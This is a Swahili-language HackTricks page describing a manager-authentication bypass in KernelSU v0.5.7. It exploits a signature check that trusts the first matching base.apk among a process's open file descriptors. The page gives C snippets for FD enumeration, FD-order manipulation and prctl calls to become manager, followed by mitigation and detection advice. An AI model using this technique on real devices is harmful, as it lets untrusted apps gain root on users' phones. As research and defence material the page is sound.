# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks kama KernelSU, APatch, SKRoot na Magisk mara nyingi hurekebisha Linux/Android kernel na kufichua utendaji wenye privileged kwa app ya "manager" ya userspace isiyo na privileged kupitia syscall iliyohookiwa. Ikiwa hatua ya manager-authentication ina dosari, app yoyote ya ndani inaweza kufikia channel hii na kuongeza privileges kwenye vifaa ambavyo tayari vime-rootiwa.

Ukurasa huu unaeleza kwa muhtasari techniques na pitfalls zilizogunduliwa katika research ya umma (hasa uchanganuzi wa Zimperium wa KernelSU v0.5.7) ili kusaidia red na blue teams kuelewa attack surfaces, exploitation primitives na robust mitigations.

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch inahook syscall (kwa kawaida prctl) ili kupokea "commands" kutoka userspace.
- Protocol kwa kawaida ni: magic_value, command_id, arg_ptr/len ...
- App ya userspace manager hu-authenticate kwanza (kwa mfano, CMD_BECOME_MANAGER). Kernel ikishaweka caller kuwa manager anayeaminika, privileged commands hukubaliwa:
- Grant root kwa caller (kwa mfano, CMD_GRANT_ROOT)
- Manage allowlists/deny-lists za su
- Rekebisha SELinux policy (kwa mfano, CMD_SET_SEPOLICY)
- Query version/configuration
- Kwa kuwa app yoyote inaweza ku-invoke syscalls, usahihi wa manager authentication ni muhimu sana.

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value ya kuelekeza kwenye KernelSU handler: 0xDEADBEEF
- Commands zinajumuisha: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## KernelSU v0.5.7 authentication flow (kama ilivyotekelezwa)

Userspace inapoiita prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU huthibitisha:

1) Path prefix check
- Path iliyotolewa lazima ianze na prefix inayotarajiwa kwa UID ya caller, kwa mfano /data/data/<pkg> au /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.

2) Ownership check
- Path lazima iwe inamilikiwa na UID ya caller.
- Reference: core_hook.c (v0.5.7) ownership logic.

3) APK signature check kupitia FD table scan
- Iterates file descriptors (FDs) zilizo wazi za calling process.
- Huchagua file ya kwanza ambayo path yake inalingana na /data/app/*/base.apk.
- Huchanganua APK v2 signature na kuithibitisha dhidi ya official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).

Checks zote zikifaulu, kernel hu-cache UID ya manager kwa muda na hukubali privileged commands kutoka kwa UID hiyo hadi ifanyiwe reset.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

Ikiwa signature check inafungamana na "the first matching /data/app/*/base.apk" inayopatikana kwenye FD table ya process, basi kwa kweli haithibitishi package ya caller mwenyewe. Attacker anaweza kuweka mapema APK iliyosainiwa kihalali (ya manager halisi) ili ionekane mapema kwenye FD list kuliko base.apk yake mwenyewe.

Trust-by-indirection hii huruhusu app isiyo na privileged kuiga manager bila kumiliki signing key ya manager.

Key properties zilizotumiwa:
- FD scan haiifungamanishi na package identity ya caller; hulinganisha tu path strings kwa pattern.
- open() hurudisha FD yenye nambari ndogo zaidi inayopatikana. Kwa kufunga FDs zenye nambari ndogo kwanza, attacker anaweza kudhibiti ordering.
- Filter hukagua tu kwamba path inalingana na /data/app/*/base.apk – si kwamba inahusiana na package iliyosakinishwa ya caller.

---
## Attack preconditions

- Kifaa tayari kime-rootiwa kwa kutumia rooting framework yenye vulnerability (kwa mfano, KernelSU v0.5.7).
- Attacker anaweza kuendesha arbitrary unprivileged code locally (Android app process).
- Manager halisi bado haija-authenticate (kwa mfano, mara tu baada ya reboot). Baadhi ya frameworks hu-cache manager UID baada ya success; lazima ushinde race.

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:
1) Tengeneza path halali ya directory ya data ya app yako ili kutimiza prefix na ownership checks.
2) Hakikisha genuine KernelSU Manager base.apk imefunguliwa kwenye FD yenye nambari ndogo kuliko base.apk yako.
3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) ili kupitisha checks.
4) Issue privileged commands kama CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY ili elevation idumu.

Practical notes kuhusu step 2 (FD ordering):
- Tambua FD ya process yako kwa /data/app/*/base.apk yako mwenyewe kwa kutembea kwenye symlinks za /proc/self/fd.
- Funga FD yenye nambari ndogo (kwa mfano, stdin, fd 0) kisha ufungue legitimate manager APK kwanza ili ichukue fd 0 (au index yoyote iliyo chini ya fd ya base.apk yako).
- Bundle genuine manager APK pamoja na app yako ili path yake itimize naive filter ya kernel. Kwa mfano, iweke chini ya subpath inayolingana na /data/app/*/base.apk.

Example code snippets (Android/Linux, kwa madhumuni ya maelezo pekee):

Enumerate open FDs ili kupata entries za base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Lazimisha FD yenye nambari ya chini iElekeze kwenye manager APK halali:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Uthibitishaji wa manager kupitia prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Baada ya kufanikiwa, amri za privileged (mifano):
- CMD_GRANT_ROOT: promote mchakato wa sasa hadi root
- CMD_ALLOW_SU: ongeza package/UID yako kwenye allowlist kwa su inayoendelea
- CMD_SET_SEPOLICY: rekebisha SELinux policy kulingana na kinachoungwa mkono na framework

Kidokezo cha race/persistence:
- Sajili receiver ya BOOT_COMPLETED katika AndroidManifest (RECEIVE_BOOT_COMPLETED) ili kuanza mapema baada ya reboot na kujaribu authentication kabla ya manager halisi.

---
## Mwongozo wa detection na mitigation

Kwa watengenezaji wa framework:
- Funga authentication kwenye package/UID ya caller, si kwenye FDs zisizo maalum:
- Tafuta package ya caller kutoka kwa UID yake na uithibitishe dhidi ya signature ya package iliyosakinishwa (kupitia PackageManager), badala ya kuscan FDs.
- Ikiwa ni kernel-only, tumia utambulisho thabiti wa caller (task creds) na uthibitishe dhidi ya source of truth thabiti inayodhibitiwa na init/userspace helper, si process FDs.
- Epuka ukaguzi wa path-prefix kama utambulisho; caller anaweza kuutimiza kwa urahisi.
- Tumia challenge–response inayotegemea nonce kupitia channel na uondoe manager identity yoyote iliyohifadhiwa wakati wa boot au kwenye matukio muhimu.
- Zingatia authenticated IPC inayotegemea binder badala ya kutumia generic syscalls kupita kiasi inapowezekana.

Kwa defenders/blue team:
- Tambua uwepo wa rooting frameworks na manager processes; monitor prctl calls zenye magic constants zinazotia shaka (kwa mfano, 0xDEADBEEF) ikiwa una kernel telemetry.
- Kwenye fleets zinazodhibitiwa, zuia au toa alert kuhusu boot receivers kutoka packages zisizoaminika zinazojaribu haraka amri za privileged manager baada ya boot.
- Hakikisha devices zimesasishwa hadi matoleo ya framework yaliyopigwa patch; invalidate manager IDs zilizohifadhiwa wakati wa update.

Vikwazo vya attack:
- Inaathiri tu devices ambazo tayari zime-rootiwa kwa framework iliyo hatarini.
- Kwa kawaida huhitaji reboot/race window kabla ya manager halali kufanya authentication (baadhi ya frameworks huhifadhi manager UID hadi ifanyiwe reset).

---
## Maelezo yanayohusiana katika frameworks mbalimbali

- Authentication inayotegemea password (kwa mfano, historical APatch/SKRoot builds) inaweza kuwa dhaifu ikiwa password zinaweza kukisiwa au kuforcewa, au validations zina hitilafu.
- Authentication inayotegemea package/signature (kwa mfano, KernelSU) ni imara zaidi kimsingi, lakini lazima ifungwe kwenye caller halisi, si artefacts zisizo za moja kwa moja kama FD scans.
- Magisk: CVE-2024-48336 (MagiskEoP) ilionyesha kwamba hata ecosystems zilizokomaa zinaweza kuathiriwa na identity spoofing inayosababisha code execution yenye root ndani ya manager context.

---
## Marejeo

- [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [KernelSU project](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
